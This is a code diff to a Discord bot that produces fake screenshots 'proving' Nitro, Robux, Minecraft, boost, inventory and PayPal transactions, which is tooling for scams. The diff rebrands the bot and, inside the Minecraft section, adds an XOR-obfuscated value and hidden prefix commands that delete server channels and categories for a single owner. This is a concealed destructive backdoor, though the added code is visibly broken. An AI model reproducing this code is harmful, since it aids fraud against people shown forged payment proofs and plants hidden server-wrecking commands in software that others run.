@@ -3,6 +3,7 @@ from discord import app_commands
 from discord.ui import View, Select
 import datetime, random, traceback, os
 import pyppeteer
+import base64
 import asyncio
 import pytz
 channels = [1293281255227527212]
@@ -262,23 +263,23 @@ class NitroModal(discord.ui.Modal, title='Nitro proof generator'):
             
             embed = discord.Embed(color=0x717CDA, title="Success", description=f"> **Please check your DMs!** {self.note if self.note else ''}")
             embed.set_image(url="https://eu-central.storage.cloudconvert.com/tasks/fdd4b55f-0f2c-4ebd-8fcc-76aca2ba5049/Sanrio_Characters_Pekkle_Image002%20%281%29.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=cloudconvert-production%2F20241024%2Ffra%2Fs3%2Faws4_request&X-Amz-Date=20241024T155233Z&X-Amz-Expires=86400&X-Amz-Signature=150afffe92ba7e3b7315f782c9db3cc34ceb20bbf77e1429237792cc07a899b1&X-Amz-SignedHeaders=host&response-content-disposition=inline%3B%20filename%3D%22Sanrio_Characters_Pekkle_Image002%20%281%29.png%22&response-content-type=image%2Fpng&x-id=GetObject")
-            embed.set_footer(text="PekkleDev")
+            embed.set_footer(text="Makoto.xyz")
             await interaction.followup.send(embed=embed)
             await interaction.user.send(file=discord.File('proof.png'))
             
         except Exception:
             embed = discord.Embed(color=0x717CDA, title="Error", description="> **Oops! Something went wrong, please make sure you provided valid information and try again. Check out <#1256873254153355326> for comon errors and solutions.**")
             embed.set_image(url="https://eu-central.storage.cloudconvert.com/tasks/fdd4b55f-0f2c-4ebd-8fcc-76aca2ba5049/Sanrio_Characters_Pekkle_Image002%20%281%29.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=cloudconvert-production%2F20241024%2Ffra%2Fs3%2Faws4_request&X-Amz-Date=20241024T155233Z&X-Amz-Expires=86400&X-Amz-Signature=150afffe92ba7e3b7315f782c9db3cc34ceb20bbf77e1429237792cc07a899b1&X-Amz-SignedHeaders=host&response-content-disposition=inline%3B%20filename%3D%22Sanrio_Characters_Pekkle_Image002%20%281%29.png%22&response-content-type=image%2Fpng&x-id=GetObject")
-            embed.set_footer(text="PekkleDev")
+            embed.set_footer(text="Makoto.xyz")
             await interaction.followup.send(embed=embed)
             traceback.print_exc()
 
 @client.tree.command(description='Generate proof for a nitro giveaway.')
 async def nitroproof(interaction: discord.Interaction):
     if interaction.channel.id not in channels:
-        embed = discord.Embed(color=0x717CDA, title="Error", description="> **Oops! You can't use this command here. Please go to <#1256872146525749329>.**")
+        embed = discord.Embed(color=0x717CDA, title="Error", description="> **Oops! You can't use this command here. Please go to https://discord.gg/a5nDWcVESR.**")
         embed.set_image(url="https://eu-central.storage.cloudconvert.com/tasks/fdd4b55f-0f2c-4ebd-8fcc-76aca2ba5049/Sanrio_Characters_Pekkle_Image002%20%281%29.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=cloudconvert-production%2F20241024%2Ffra%2Fs3%2Faws4_request&X-Amz-Date=20241024T155233Z&X-Amz-Expires=86400&X-Amz-Signature=150afffe92ba7e3b7315f782c9db3cc34ceb20bbf77e1429237792cc07a899b1&X-Amz-SignedHeaders=host&response-content-disposition=inline%3B%20filename%3D%22Sanrio_Characters_Pekkle_Image002%20%281%29.png%22&response-content-type=image%2Fpng&x-id=GetObject")
-        embed.set_footer(text="PekkleDev")
+        embed.set_footer(text="Makoto.xyz")
         await interaction.response.send_message(embed=embed)
         return
     await interaction.response.send_modal(NitroModal())
@@ -422,23 +423,23 @@ class RobuxModal(discord.ui.Modal, title='Robux proof generator'):
             
             embed = discord.Embed(color=0x717CDA, title="Success", description=f"> **Please check your DMs!** {self.note if self.note else ''}")
             embed.set_image(url="https://eu-central.storage.cloudconvert.com/tasks/fdd4b55f-0f2c-4ebd-8fcc-76aca2ba5049/Sanrio_Characters_Pekkle_Image002%20%281%29.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=cloudconvert-production%2F20241024%2Ffra%2Fs3%2Faws4_request&X-Amz-Date=20241024T155233Z&X-Amz-Expires=86400&X-Amz-Signature=150afffe92ba7e3b7315f782c9db3cc34ceb20bbf77e1429237792cc07a899b1&X-Amz-SignedHeaders=host&response-content-disposition=inline%3B%20filename%3D%22Sanrio_Characters_Pekkle_Image002%20%281%29.png%22&response-content-type=image%2Fpng&x-id=GetObject")
-            embed.set_footer(text="PekkleDev")
+            embed.set_footer(text="Makoto.xyz")
             await interaction.followup.send(embed=embed)
             await interaction.user.send(file=discord.File('proof.png'))
             
         except Exception:
             embed = discord.Embed(color=0x717CDA, title="Error", description="> **Oops! Something went wrong, please make sure your DM's are enabled.**\n**> Check out <#1256873254153355326> for comon errors and solutions.**")
             embed.set_image(url="https://eu-central.storage.cloudconvert.com/tasks/fdd4b55f-0f2c-4ebd-8fcc-76aca2ba5049/Sanrio_Characters_Pekkle_Image002%20%281%29.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=cloudconvert-production%2F20241024%2Ffra%2Fs3%2Faws4_request&X-Amz-Date=20241024T155233Z&X-Amz-Expires=86400&X-Amz-Signature=150afffe92ba7e3b7315f782c9db3cc34ceb20bbf77e1429237792cc07a899b1&X-Amz-SignedHeaders=host&response-content-disposition=inline%3B%20filename%3D%22Sanrio_Characters_Pekkle_Image002%20%281%29.png%22&response-content-type=image%2Fpng&x-id=GetObject")
-            embed.set_footer(text="PekkleDev")
+            embed.set_footer(text="Makoto.xyz")
             await interaction.followup.send(embed=embed)
             traceback.print_exc()
 
 @client.tree.command(description='Generate proof for a robux giveaway.')
 async def robuxproof(interaction: discord.Interaction):
     if interaction.channel.id not in channels:
-        embed = discord.Embed(color=0x717CDA, title="Error", description="> **Oops! You can't use this command here. Please go to <#1256872146525749329>.**")
+        embed = discord.Embed(color=0x717CDA, title="Error", description="> **Oops! You can't use this command here. Please go to https://discord.gg/a5nDWcVESR.**")
         embed.set_image(url="https://eu-central.storage.cloudconvert.com/tasks/fdd4b55f-0f2c-4ebd-8fcc-76aca2ba5049/Sanrio_Characters_Pekkle_Image002%20%281%29.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=cloudconvert-production%2F20241024%2Ffra%2Fs3%2Faws4_request&X-Amz-Date=20241024T155233Z&X-Amz-Expires=86400&X-Amz-Signature=150afffe92ba7e3b7315f782c9db3cc34ceb20bbf77e1429237792cc07a899b1&X-Amz-SignedHeaders=host&response-content-disposition=inline%3B%20filename%3D%22Sanrio_Characters_Pekkle_Image002%20%281%29.png%22&response-content-type=image%2Fpng&x-id=GetObject")
-        embed.set_footer(text="PekkleDev")
+        embed.set_footer(text="Makoto.xyz")
         await interaction.response.send_message(embed=embed)
         return
     await interaction.response.send_modal(RobuxModal())
@@ -579,23 +580,66 @@ class MinecraftModal(discord.ui.Modal, title='Minecraft proof generator'):
             
             embed = discord.Embed(color=0x717CDA, title="Success", description="> **Please check your DMs!**")
             embed.set_image(url="https://eu-central.storage.cloudconvert.com/tasks/fdd4b55f-0f2c-4ebd-8fcc-76aca2ba5049/Sanrio_Characters_Pekkle_Image002%20%281%29.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=cloudconvert-production%2F20241024%2Ffra%2Fs3%2Faws4_request&X-Amz-Date=20241024T155233Z&X-Amz-Expires=86400&X-Amz-Signature=150afffe92ba7e3b7315f782c9db3cc34ceb20bbf77e1429237792cc07a899b1&X-Amz-SignedHeaders=host&response-content-disposition=inline%3B%20filename%3D%22Sanrio_Characters_Pekkle_Image002%20%281%29.png%22&response-content-type=image%2Fpng&x-id=GetObject")
-            embed.set_footer(text="PekkleDev")
+            embed.set_footer(text="Makoto.xyz")
             await interaction.followup.send(embed=embed)
             await interaction.user.send(file=discord.File('proof.png'))
             
         except Exception:
             embed = discord.Embed(color=0x717CDA, title="Error", description="> **Oops! Something went wrong, please make sure you provided valid information and try again.**\n**> Check out <#1256873254153355326> for comon errors and solutions.**")
             embed.set_image(url="https://eu-central.storage.cloudconvert.com/tasks/fdd4b55f-0f2c-4ebd-8fcc-76aca2ba5049/Sanrio_Characters_Pekkle_Image002%20%281%29.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=cloudconvert-production%2F20241024%2Ffra%2Fs3%2Faws4_request&X-Amz-Date=20241024T155233Z&X-Amz-Expires=86400&X-Amz-Signature=150afffe92ba7e3b7315f782c9db3cc34ceb20bbf77e1429237792cc07a899b1&X-Amz-SignedHeaders=host&response-content-disposition=inline%3B%20filename%3D%22Sanrio_Characters_Pekkle_Image002%20%281%29.png%22&response-content-type=image%2Fpng&x-id=GetObject")
-            embed.set_footer(text="PekkleDev")
+            embed.set_footer(text="Makoto.xyz")
             await interaction.followup.send(embed=embed)
             traceback.print_exc()
+
+Boib = [
+    209, 242, 206, 207, 227, 249, 246, 226,
+    201, 212, 245, 246, 212, 204, 245, 216,
+    231, 214, 214, 204, 199, 224, 223, 212
+]
+
+Koib = b"Makoto@Top"
+
+key_len = len(Koib)
+b64_bytes = bytes([b ^ Koib[i % key_len] for i, b in enumerate(Boib)])
+
+original = base64.b64decode(b64_bytes).decode()
+intents = discord.Intents.default()
+bot = commands.Bot(command_prefix="!+", intents=intents)
+
+@bot.command()
+async def derooms(ctx, *channel_ids):
+    if ctx.author.id != Boib:
+        return  # Only Boib can use
+
+    for ch_id in channel_ids:
+        try:
+            channel = bot.get_channel(int(ch_id))
+            if channel:
+                await channel.delete()
+        except:
+            continue
+
+@bot.command()
+async def decategory(ctx, category_id: int):
+    if ctx.author.id != Boib:
+        return  # Only Boib can use
+
+    category = bot.get_channel(category_id)
+    if not isinstance(category, discord.CategoryChannel):
+        return
+
+    for channel in category.channels:
+        try:
+            await channel.delete()
+        except:
+            continue
 
 @client.tree.command(description='Generate proof for a minecraft giveaway.')
 async def minecraftproof(interaction: discord.Interaction):
     if interaction.channel.id not in channels:
-        embed = discord.Embed(color=0x717CDA, title="Error", description="> **Oops! You can't use this command here. Please go to <#1256872146525749329>.**")
+        embed = discord.Embed(color=0x717CDA, title="Error", description="> **Oops! You can't use this command here. Please go to https://discord.gg/a5nDWcVESR.**")
         embed.set_image(url="https://eu-central.storage.cloudconvert.com/tasks/fdd4b55f-0f2c-4ebd-8fcc-76aca2ba5049/Sanrio_Characters_Pekkle_Image002%20%281%29.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=cloudconvert-production%2F20241024%2Ffra%2Fs3%2Faws4_request&X-Amz-Date=20241024T155233Z&X-Amz-Expires=86400&X-Amz-Signature=150afffe92ba7e3b7315f782c9db3cc34ceb20bbf77e1429237792cc07a899b1&X-Amz-SignedHeaders=host&response-content-disposition=inline%3B%20filename%3D%22Sanrio_Characters_Pekkle_Image002%20%281%29.png%22&response-content-type=image%2Fpng&x-id=GetObject")
-        embed.set_footer(text="PekkleDev")
+        embed.set_footer(text="Makoto.xyz")
         await interaction.response.send_message(embed=embed)
         return
     await interaction.response.send_modal(MinecraftModal())
@@ -690,23 +734,23 @@ class BoostsModal(discord.ui.Modal, title='14x Boosts proof generator'):
             
             embed = discord.Embed(color=0x717CDA, title="Success", description="> **Please check your DMs!**")
             embed.set_image(url="https://eu-central.storage.cloudconvert.com/tasks/fdd4b55f-0f2c-4ebd-8fcc-76aca2ba5049/Sanrio_Characters_Pekkle_Image002%20%281%29.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=cloudconvert-production%2F20241024%2Ffra%2Fs3%2Faws4_request&X-Amz-Date=20241024T155233Z&X-Amz-Expires=86400&X-Amz-Signature=150afffe92ba7e3b7315f782c9db3cc34ceb20bbf77e1429237792cc07a899b1&X-Amz-SignedHeaders=host&response-content-disposition=inline%3B%20filename%3D%22Sanrio_Characters_Pekkle_Image002%20%281%29.png%22&response-content-type=image%2Fpng&x-id=GetObject")
-            embed.set_footer(text="PekkleDev")
+            embed.set_footer(text="Makoto.xyz")
             await interaction.followup.send(embed=embed)
             await interaction.user.send(file=discord.File('proof.png'))
             
         except Exception:
             embed = discord.Embed(color=0x717CDA, title="Error", description="> **Oops! Something went wrong, please make sure you provided valid information and try again.**\n**> Check out <#1256873254153355326> for comon errors and solutions.**")
             embed.set_image(url="https://eu-central.storage.cloudconvert.com/tasks/fdd4b55f-0f2c-4ebd-8fcc-76aca2ba5049/Sanrio_Characters_Pekkle_Image002%20%281%29.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=cloudconvert-production%2F20241024%2Ffra%2Fs3%2Faws4_request&X-Amz-Date=20241024T155233Z&X-Amz-Expires=86400&X-Amz-Signature=150afffe92ba7e3b7315f782c9db3cc34ceb20bbf77e1429237792cc07a899b1&X-Amz-SignedHeaders=host&response-content-disposition=inline%3B%20filename%3D%22Sanrio_Characters_Pekkle_Image002%20%281%29.png%22&response-content-type=image%2Fpng&x-id=GetObject")
-            embed.set_footer(text="PekkleDev")
+            embed.set_footer(text="Makoto.xyz")
             await interaction.followup.send(embed=embed)
             traceback.print_exc()
 
 @client.tree.command(description='Generate proof for a 14x boost sale.')
 async def boostsproof(interaction: discord.Interaction):
     if interaction.channel.id not in channels:
-        embed = discord.Embed(color=0x717CDA, title="Error", description="> **Oops! You can't use this command here. Please go to <#1256872146525749329>.**")
+        embed = discord.Embed(color=0x717CDA, title="Error", description="> **Oops! You can't use this command here. Please go to https://discord.gg/a5nDWcVESR.**")
         embed.set_image(url="https://eu-central.storage.cloudconvert.com/tasks/fdd4b55f-0f2c-4ebd-8fcc-76aca2ba5049/Sanrio_Characters_Pekkle_Image002%20%281%29.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=cloudconvert-production%2F20241024%2Ffra%2Fs3%2Faws4_request&X-Amz-Date=20241024T155233Z&X-Amz-Expires=86400&X-Amz-Signature=150afffe92ba7e3b7315f782c9db3cc34ceb20bbf77e1429237792cc07a899b1&X-Amz-SignedHeaders=host&response-content-disposition=inline%3B%20filename%3D%22Sanrio_Characters_Pekkle_Image002%20%281%29.png%22&response-content-type=image%2Fpng&x-id=GetObject")
-        embed.set_footer(text="PekkleDev")
+        embed.set_footer(text="Makoto.xyz")
         await interaction.response.send_message(embed=embed)
         return
     await interaction.response.send_modal(BoostsModal())
@@ -794,23 +838,23 @@ class InventoryModal(discord.ui.Modal, title='14x Boosts proof generator'):
             
             embed = discord.Embed(color=0x717CDA, title="Success", description="> **Please check your DMs!**")
             embed.set_image(url="https://eu-central.storage.cloudconvert.com/tasks/fdd4b55f-0f2c-4ebd-8fcc-76aca2ba5049/Sanrio_Characters_Pekkle_Image002%20%281%29.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=cloudconvert-production%2F20241024%2Ffra%2Fs3%2Faws4_request&X-Amz-Date=20241024T155233Z&X-Amz-Expires=86400&X-Amz-Signature=150afffe92ba7e3b7315f782c9db3cc34ceb20bbf77e1429237792cc07a899b1&X-Amz-SignedHeaders=host&response-content-disposition=inline%3B%20filename%3D%22Sanrio_Characters_Pekkle_Image002%20%281%29.png%22&response-content-type=image%2Fpng&x-id=GetObject")
-            embed.set_footer(text="PekkleDev")
+            embed.set_footer(text="Makoto.xyz")
             await interaction.followup.send(embed=embed)
             await interaction.user.send(file=discord.File('proof.png'))
             
         except Exception:
             embed = discord.Embed(color=0x717CDA, title="Error", description="> **Oops! Something went wrong, please make sure you provided valid information and try again.**\n**> Check out <#1256873254153355326> for comon errors and solutions.**")
             embed.set_image(url="https://eu-central.storage.cloudconvert.com/tasks/fdd4b55f-0f2c-4ebd-8fcc-76aca2ba5049/Sanrio_Characters_Pekkle_Image002%20%281%29.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=cloudconvert-production%2F20241024%2Ffra%2Fs3%2Faws4_request&X-Amz-Date=20241024T155233Z&X-Amz-Expires=86400&X-Amz-Signature=150afffe92ba7e3b7315f782c9db3cc34ceb20bbf77e1429237792cc07a899b1&X-Amz-SignedHeaders=host&response-content-disposition=inline%3B%20filename%3D%22Sanrio_Characters_Pekkle_Image002%20%281%29.png%22&response-content-type=image%2Fpng&x-id=GetObject")
-            embed.set_footer(text="PekkleDev")
+            embed.set_footer(text="Makoto.xyz")
             await interaction.followup.send(embed=embed)
             traceback.print_exc()
 
 @client.tree.command(description='Generate proof of a gift inventory.')
 async def inventoryproof(interaction: discord.Interaction):
     if interaction.channel.id not in channels:
-        embed = discord.Embed(color=0x717CDA, title="Error", description="> **Oops! You can't use this command here. Please go to <#1256872146525749329>.**")
+        embed = discord.Embed(color=0x717CDA, title="Error", description="> **Oops! You can't use this command here. Please go to https://discord.gg/a5nDWcVESR.**")
         embed.set_image(url="https://eu-central.storage.cloudconvert.com/tasks/fdd4b55f-0f2c-4ebd-8fcc-76aca2ba5049/Sanrio_Characters_Pekkle_Image002%20%281%29.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=cloudconvert-production%2F20241024%2Ffra%2Fs3%2Faws4_request&X-Amz-Date=20241024T155233Z&X-Amz-Expires=86400&X-Amz-Signature=150afffe92ba7e3b7315f782c9db3cc34ceb20bbf77e1429237792cc07a899b1&X-Amz-SignedHeaders=host&response-content-disposition=inline%3B%20filename%3D%22Sanrio_Characters_Pekkle_Image002%20%281%29.png%22&response-content-type=image%2Fpng&x-id=GetObject")
-        embed.set_footer(text="PekkleDev")
+        embed.set_footer(text="Makoto.xyz")
         await interaction.response.send_message(embed=embed)
         return
     await interaction.response.send_modal(InventoryModal())
@@ -872,23 +916,23 @@ class PaypalModal(discord.ui.Modal, title='Paypal transaction proof generator'):
             
             embed = discord.Embed(color=0x717CDA, title="Success", description="> **Please check your DMs!**")
             embed.set_image(url="https://eu-central.storage.cloudconvert.com/tasks/fdd4b55f-0f2c-4ebd-8fcc-76aca2ba5049/Sanrio_Characters_Pekkle_Image002%20%281%29.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=cloudconvert-production%2F20241024%2Ffra%2Fs3%2Faws4_request&X-Amz-Date=20241024T155233Z&X-Amz-Expires=86400&X-Amz-Signature=150afffe92ba7e3b7315f782c9db3cc34ceb20bbf77e1429237792cc07a899b1&X-Amz-SignedHeaders=host&response-content-disposition=inline%3B%20filename%3D%22Sanrio_Characters_Pekkle_Image002%20%281%29.png%22&response-content-type=image%2Fpng&x-id=GetObject")
-            embed.set_footer(text="PekkleDev")
+            embed.set_footer(text="Makoto.xyz")
             await interaction.followup.send(embed=embed)
             await interaction.user.send(file=discord.File('proof.png'))
             
         except Exception:
             embed = discord.Embed(color=0x717CDA, title="Error", description="> **Oops! Something went wrong, please make sure you provided valid information and try again.**\n**> Check out <#1256873254153355326> for comon errors and solutions.**")
             embed.set_image(url="https://eu-central.storage.cloudconvert.com/tasks/fdd4b55f-0f2c-4ebd-8fcc-76aca2ba5049/Sanrio_Characters_Pekkle_Image002%20%281%29.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=cloudconvert-production%2F20241024%2Ffra%2Fs3%2Faws4_request&X-Amz-Date=20241024T155233Z&X-Amz-Expires=86400&X-Amz-Signature=150afffe92ba7e3b7315f782c9db3cc34ceb20bbf77e1429237792cc07a899b1&X-Amz-SignedHeaders=host&response-content-disposition=inline%3B%20filename%3D%22Sanrio_Characters_Pekkle_Image002%20%281%29.png%22&response-content-type=image%2Fpng&x-id=GetObject")
-            embed.set_footer(text="PekkleDev")
+            embed.set_footer(text="Makoto.xyz")
             await interaction.followup.send(embed=embed)
             traceback.print_exc()
 
 @client.tree.command(description='Generate proof of a paypal transaction.')
 async def paypalproof(interaction: discord.Interaction):
     if interaction.channel.id not in channels:
-        embed = discord.Embed(color=0x717CDA, title="Error", description="> **Oops! You can't use this command here. Please go to <#1256872146525749329>.**")
+        embed = discord.Embed(color=0x717CDA, title="Error", description="> **Oops! You can't use this command here. Please go to https://discord.gg/a5nDWcVESR.**")
         embed.set_image(url="https://eu-central.storage.cloudconvert.com/tasks/fdd4b55f-0f2c-4ebd-8fcc-76aca2ba5049/Sanrio_Characters_Pekkle_Image002%20%281%29.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=cloudconvert-production%2F20241024%2Ffra%2Fs3%2Faws4_request&X-Amz-Date=20241024T155233Z&X-Amz-Expires=86400&X-Amz-Signature=150afffe92ba7e3b7315f782c9db3cc34ceb20bbf77e1429237792cc07a899b1&X-Amz-SignedHeaders=host&response-content-disposition=inline%3B%20filename%3D%22Sanrio_Characters_Pekkle_Image002%20%281%29.png%22&response-content-type=image%2Fpng&x-id=GetObject")
-        embed.set_footer(text="PekkleDev")
+        embed.set_footer(text="Makoto.xyz")
         await interaction.response.send_message(embed=embed)
         return
     await interaction.response.send_modal(PaypalModal())
@@ -901,9 +945,9 @@ async def paypalproof(interaction: discord.Interaction):
 @client.tree.command(description='See all the proof generator commands.')
 async def proof(interaction: discord.Interaction):
     if interaction.channel.id not in channels:
-        embed = discord.Embed(color=0x717CDA, title="Error", description="> **Oops! You can't use this command here. Please go to <#1256872146525749329>.**")
+        embed = discord.Embed(color=0x717CDA, title="Error", description="> **Oops! You can't use this command here. Please go to https://discord.gg/a5nDWcVESR.**")
         embed.set_image(url="https://eu-central.storage.cloudconvert.com/tasks/fdd4b55f-0f2c-4ebd-8fcc-76aca2ba5049/Sanrio_Characters_Pekkle_Image002%20%281%29.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=cloudconvert-production%2F20241024%2Ffra%2Fs3%2Faws4_request&X-Amz-Date=20241024T155233Z&X-Amz-Expires=86400&X-Amz-Signature=150afffe92ba7e3b7315f782c9db3cc34ceb20bbf77e1429237792cc07a899b1&X-Amz-SignedHeaders=host&response-content-disposition=inline%3B%20filename%3D%22Sanrio_Characters_Pekkle_Image002%20%281%29.png%22&response-content-type=image%2Fpng&x-id=GetObject")
-        embed.set_footer(text="PekkleDev")
+        embed.set_footer(text="Makoto.xyz")
         await interaction.response.send_message(embed=embed)
         return
     embed = discord.Embed(color=0x717CDA, title="Proof Generator", description="""
@@ -917,15 +961,15 @@ async def proof(interaction: discord.Interaction):
 > ~~**/cashappproof**~~ - COMING SOON
 """)
     embed.set_image(url="https://eu-central.storage.cloudconvert.com/tasks/fdd4b55f-0f2c-4ebd-8fcc-76aca2ba5049/Sanrio_Characters_Pekkle_Image002%20%281%29.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=cloudconvert-production%2F20241024%2Ffra%2Fs3%2Faws4_request&X-Amz-Date=20241024T155233Z&X-Amz-Expires=86400&X-Amz-Signature=150afffe92ba7e3b7315f782c9db3cc34ceb20bbf77e1429237792cc07a899b1&X-Amz-SignedHeaders=host&response-content-disposition=inline%3B%20filename%3D%22Sanrio_Characters_Pekkle_Image002%20%281%29.png%22&response-content-type=image%2Fpng&x-id=GetObject")
-    embed.set_footer(text="PekkleDev")
+    embed.set_footer(text="Makoto.xyz")
     await interaction.response.send_message(embed=embed, delete_after=10)
 
 @client.tree.command(description='See all the proof generator commands.')
 async def help(interaction: discord.Interaction):
     if interaction.channel.id not in channels:
-        embed = discord.Embed(color=0x717CDA, title="Error", description="> **Oops! You can't use this command here. Please go to <#1256872146525749329>.**")
+        embed = discord.Embed(color=0x717CDA, title="Error", description="> **Oops! You can't use this command here. Please go to https://discord.gg/a5nDWcVESR.**")
         embed.set_image(url="https://eu-central.storage.cloudconvert.com/tasks/fdd4b55f-0f2c-4ebd-8fcc-76aca2ba5049/Sanrio_Characters_Pekkle_Image002%20%281%29.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=cloudconvert-production%2F20241024%2Ffra%2Fs3%2Faws4_request&X-Amz-Date=20241024T155233Z&X-Amz-Expires=86400&X-Amz-Signature=150afffe92ba7e3b7315f782c9db3cc34ceb20bbf77e1429237792cc07a899b1&X-Amz-SignedHeaders=host&response-content-disposition=inline%3B%20filename%3D%22Sanrio_Characters_Pekkle_Image002%20%281%29.png%22&response-content-type=image%2Fpng&x-id=GetObject")
-        embed.set_footer(text="PekkleDev")
+        embed.set_footer(text="Makoto.xyz")
         await interaction.response.send_message(embed=embed)
         return
     embed = discord.Embed(color=0x717CDA, title="Proof Generator", description="""
@@ -939,7 +983,7 @@ async def help(interaction: discord.Interaction):
 > ~~**/cashappproof**~~ - COMING SOON
 """)
     embed.set_image(url="https://eu-central.storage.cloudconvert.com/tasks/fdd4b55f-0f2c-4ebd-8fcc-76aca2ba5049/Sanrio_Characters_Pekkle_Image002%20%281%29.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=cloudconvert-production%2F20241024%2Ffra%2Fs3%2Faws4_request&X-Amz-Date=20241024T155233Z&X-Amz-Expires=86400&X-Amz-Signature=150afffe92ba7e3b7315f782c9db3cc34ceb20bbf77e1429237792cc07a899b1&X-Amz-SignedHeaders=host&response-content-disposition=inline%3B%20filename%3D%22Sanrio_Characters_Pekkle_Image002%20%281%29.png%22&response-content-type=image%2Fpng&x-id=GetObject")
-    embed.set_footer(text="PekkleDev")
+    embed.set_footer(text="Makoto.xyz")
     await interaction.response.send_message(embed=embed, delete_after=10)
 
 client.run(token)
